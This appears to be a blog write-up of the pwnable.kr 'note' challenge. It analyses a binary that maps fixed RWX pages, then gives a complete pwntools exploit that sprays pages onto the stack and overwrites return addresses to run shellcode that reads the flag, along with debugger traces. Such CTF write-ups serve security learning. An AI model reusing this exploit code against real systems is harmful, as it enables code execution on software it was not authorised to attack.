---
layout: post
title:  Pwnable.kr - note
categories: [pwnable.kr]
excerpt: Writeup for note.
---
# Pwnable.kr - Note

The challenge can be found [here](http://pwnable.kr/play.php).

Without at least an attempt at the challenge, this writeup will probably not make much sense.
This is done to keep at least somewhat in the spirit of pwnable.kr style writeups.

# Defining The Attack Surface
A quick `checksec` reveals the following:
```
[*] '/home/alexsieusahai/pwnablekr/note/note'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
No canary in particular will be super useful, as we'll see soon.

We're also given a readme and the source code; the readme is below for convenience:
```
the "note" binary will be executed under note_pwn privilege if you connect to port 9019.
execute the binary by connecting to daemon(nc 0 9019) then pwn it, then get flag.
* ASLR is disabled for this challenge
```
Importantly, `ASLR` is disabled; the stack will always be in the same place.

A quick `strings` over the binary doesn't reveal any `"/bin/"` string, so we'll eventually need to call shellcode or some sort, probably, in order to read the flag.

We do page allocation via `create_note() -> mmap_s(...)`.
Importantly, when we allocate notes, we restrict the range of our notes to be above `0x80000000`, and page aligned (a multiple of `0x1000 = 4096`).
Additionally, these pages are always allocated _exactly_ where `mmap_s` places them, due to the `MAP_FIXED` flag turned on.
Lastly, we can execute code on these pages and write to them, as we have all of `PROT_READ|PROT_WRITE|PROT_EXEC` turned on.

```c
void mmap_s(...)
{
  // flags has on MAP_FIXED on
  // prot has PROT_READ|PROT_WRITE|PROT_EXEC on
  addr = (void*)( ((int)addr & 0xFFFFF000) | 0x80000000 );
  while(1){
      // linearly search empty page (maybe this can be improved)
      tmp = mmap(addr, length, prot, flags | MAP_FIXED, fd, offset);
      if(tmp != MAP_FAILED){
          return tmp;
      }
      else{
          // memory already in use!
          addr = (void*)((int)addr + PAGE_SIZE);	// choose adjacent page
      }
  }
  // ...
}
```

A quick glance at /proc/$PID/maps for the note process gives us
```
...
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```

Importantly, we don't have ASLR enabled according to the `readme` (see above), so this stack will always be in the same place.

Importantly, we can certainly allocate a page that writes _into_ the stack.
Additionally, since we're dealing with a 32-bit architecture (see the `checksec` output), this approach becomes feasible.
The solution conceptually at this point is pretty simple.
Allocate a page with shellcode, and remember where this is.
Otherwise, spam page creation (and deletion to clean up) until we happen to allocate a page onto the stack, and overwrite the entire page with the location of the shellcode, causing us to certainly overwrite a portion of the callstack.

Additionally, the `select_menu -> *note -> select_menu` control flow is handled recursively, allowing us to blow up the stack and consequently increase the pages that are viable for attack.

# Feasibility of this stack overwrite attack, and resulting implementation caveats

From the `maps` output above, we know the start of our stack is `0xffffe000`.
So, we know, at least initially, that we only have 2 possible pages out of `16 ** 5` giving us an expected amount of attempts as 524,288.

Thankfully, every single time we do an action, we decrease `esp` by `0x430` (I just found this with gdb); every 256 page creations and subsequent 256 page deletions causes `esp` to decrease by 0x86000; this gives us an extra 134 pages that become viable.

We can quickly (under)estimate the amount of pages that are required off of this.
For the `k`th iteration of `creation -> deletion`, we have 2 + 134 * k pages available.

Unfortunately, practicaly going beyond this is currently beyond me, as the program seems to crash unpredictably with respect to the amount of times that I can do this `creation -> deletion` process.
My current guess is that I end up overwriting some portions of memory that belong to libc, the linker, or other relevant "external" sources before I end up overwriting the stack; I was able to solve this without looking into it more, however, so I never revisited it.

# Implementation (High Level Plan)

* Allocate a stack frame, write shellcode there, and remember where this is.
* Allocate 255 frames (batched to reduce the amount of inter-process communication), and if any of them belong to the current stack area, write the shellcode location everywhere and `note_exit` to eventually `RET` to the shellcode.
* If that fails, then deallocate all 255 frames, and go to the first step.

If the process ever dies for whatever reason, just restart it.

# Postulating about process death
Far and away the most common reason for death seems to be from `vfprintf_internal`.

In particular, it seems that `vfprintf_internal` uses some space below where we're trying to use as scratch space; take this example `pwndbg` output for example:

```bash
Program received signal SIGSEGV, Segmentation fault.
0xf7e1d1e8 in __vfprintf_internal (s=0xfff60264, format=0x8048cd0 "note created. no %d\n [%08x]", ap=0xfff62874 "I", mode_flags=0) at vfprintf-internal.c:1289
1289	vfprintf-internal.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
*EAX  0x8048cd0 ◂— outsb  dx, byte ptr [esi] /* 'note created. no %d\n [%08x]' */
*EBX  0xf7fca100 ◂— 0xf7fca100
*ECX  0xfff62874 ◂— 0x49 /* 'I' */
*EDX  0x8048cd0 ◂— outsb  dx, byte ptr [esi] /* 'note created. no %d\n [%08x]' */
*EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
*ESI  0xfff60264 ◂— 0xfbad8004
*EBP  0xfff60228 —▸ 0xfff62848 —▸ 0xfff628a8 —▸ 0xfff62cd8 —▸ 0xfff63108 ◂— ...
*ESP  0xfff5fd20
*EIP  0xf7e1d1e8 (__vfprintf_internal+40) ◂— mov    dword ptr [ebp - 0x470], eax
───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────
 ► 0xf7e1d1e8 <__vfprintf_internal+40>    mov    dword ptr [ebp - 0x470], eax
   0xf7e1d1ee <__vfprintf_internal+46>    mov    eax, dword ptr [ebp + 0x10]
   0xf7e1d1f1 <__vfprintf_internal+49>    mov    dword ptr [ebp - 0x480], eax
   0xf7e1d1f7 <__vfprintf_internal+55>    mov    eax, dword ptr gs:[0x14]
   0xf7e1d1fd <__vfprintf_internal+61>    mov    dword ptr [ebp - 0x1c], eax
   0xf7e1d200 <__vfprintf_internal+64>    xor    eax, eax
   0xf7e1d202 <__vfprintf_internal+66>    mov    eax, dword ptr [edi - 0x108]
   0xf7e1d208 <__vfprintf_internal+72>    cmp    byte ptr [esi + 0x46], 0
   0xf7e1d20c <__vfprintf_internal+76>    mov    dword ptr [ebp - 0x4a0], eax
   0xf7e1d212 <__vfprintf_internal+82>    mov    eax, dword ptr [ebx + eax]
   0xf7e1d215 <__vfprintf_internal+85>    mov    dword ptr [ebp - 0x4a4], eax
────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
<Could not read memory at 0xfff5fd20>
──────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0 0xf7e1d1e8 __vfprintf_internal+40
   f 1 0xf7e20088 buffered_vfprintf+200
   f 2 0xf7e1d8d1 __vfprintf_internal+1809
   f 3 0xf7e0c2c9 printf+41
    f 4 0x804874c create_note+124
   f 5 0x8048980 select_menu+155
   f 6 0x80489f0 select_menu+267
   f 7 0x80489f0 select_menu+267
─────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

My current guess is that initially, the operating system allocates the stack space as described in the `/proc/$PID/maps` file, which is why `vfprintf_internal` is confident clobbering that memory; I'm fairly confident as well that `0x470` comes from the stack frame plus some offset, so from the eyes of `vfprintf_internal`, we're changing memory which no stack frame has, so when we do stack entry we'll just overwrite that data with something belonging to the next stack frame.

However, who knows?
I couldn't find very much information googling around for such a thing, other than "do not do this".

# Implementation
This solution tends to find the flag at around 1000-1500 page creation attempts total.
This solution is also in `python3`; translation to `python2` to run on the server and get the flag is left to the reader.

This code is fairly clean, as it's mainly a wrapper around the `note` binary along with some common-sense extensions that are relevant to the solution, such as `fill_mem_table` and `clear_mem_table` in order to handle the systematic filling and clearing of the mem table until we find the solution.

The only function, if any, that would need a description would be the following:
```python
    def fill_mem_table(self):
        shellcode_loc = self.shellcode_page()
        [self.create_page() for _ in range(255)]
        locs = [self.get_page_loc(outp) for outp in
                    self.p.clean().split(b'1. create note')[:-1]]

        for i in range(len(locs)):
            self.current_attempt += 1
            print(self.current_attempt, hex(locs[i]))

            if (locs[i] >= self.stack_curr) or (locs[i] + PAGE_SIZE >= self.stack_curr):
                print('lucky s_mmap; grabbing flag...')
                self.write_page(str(i+1).encode(), p32(shellcode_loc) * 1023)
                self.note_exit()
                print(self.p.clean(10).decode())
                exit(0)
```

We first need our shellcode somewhere, hence the first call to `shellcode_loc`.
Then, we do mass page creation before requesting everything in a batch, in order to greatly reduce the overhead from `clean` as our way of getting output from the process.
If we ever write to the stack, we certainly can infect at least one of the return pointers on the stack, hence the mass write of the addresses.
We then call `note_exit` to bubble everything up, hit one of these infected addresses, and ret to our shellcode, giving us the flag!

Also, clearly, every single time we call any function, we add onto our callstack, hence the `self.stack_curr` variable; it's used for bookkeeping, to know our win window.

```python
import time
from sys import exit
from pwn import *

"""
remember to echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
before running in order to turn off aslr, as spec'd in readme
"""

# from /proc/{PID}/maps
INITIAL_STACK = 0xffffe000
PAGE_SIZE = 4096

class Note:
    """
    API around the note bin, using pwn.process
    """
    def __init__(self):
        self.stack_curr = INITIAL_STACK
        self.p = process('./note')
        time.sleep(10.1)  # wait for p to finish spewing its nonsense
        self.current_attempt = 0
        self.shellcode = asm(
            shellcraft.i386.linux.cat('flag'), arch='i386', os='linux')

    @staticmethod
    def get_page_loc(outp):
        outp = outp.split(b'\n')
        wanted = next(filter(lambda x: b'[' in x and b']' in x, outp))
        offset = eval('0x' + wanted[wanted.find(b'[')+1:wanted.find(b']')].decode())
        return offset

    def create_page(self):
        self.p.send(b'1\n')
        self.stack_curr -= 0x430

    def write_page(self, which, b):
        b = b'2\n' + which + b'\n' + b + b'\n'
        self.p.send(b)
        self.stack_curr -= 0x430

    def delete_page(self, i):
        self.p.send((f'4\n{i}\n').encode())
        self.stack_curr -= 0x430

    def note_exit(self):
        self.p.sendline(b'5')

    def shellcode_page(self):
        self.create_page()
        self.write_page(b'0', self.shellcode)
        offset = self.get_page_loc(self.p.clean())
        return offset

    def fill_mem_table(self):
        shellcode_loc = self.shellcode_page()
        [self.create_page() for _ in range(255)]
        locs = [self.get_page_loc(outp) for outp in
                    self.p.clean().split(b'1. create note')[:-1]]

        for i in range(len(locs)):
            self.current_attempt += 1
            print(self.current_attempt, hex(locs[i]))

            if (locs[i] >= self.stack_curr) or (locs[i] + PAGE_SIZE >= self.stack_curr):
                print('lucky s_mmap; grabbing flag...')
                self.write_page(str(i+1).encode(), p32(shellcode_loc) * 1023)
                self.note_exit()
                print(self.p.clean(10).decode())
                exit(0)

    def clear_mem_table(self):
        [self.delete_page(i) for i in range(256)]


note = Note()
while True:
    try:
        note.fill_mem_table()
        note.clear_mem_table()
    except (StopIteration, EOFError):
        print('something failed; spinning up new Note...')
        note = Note()
```
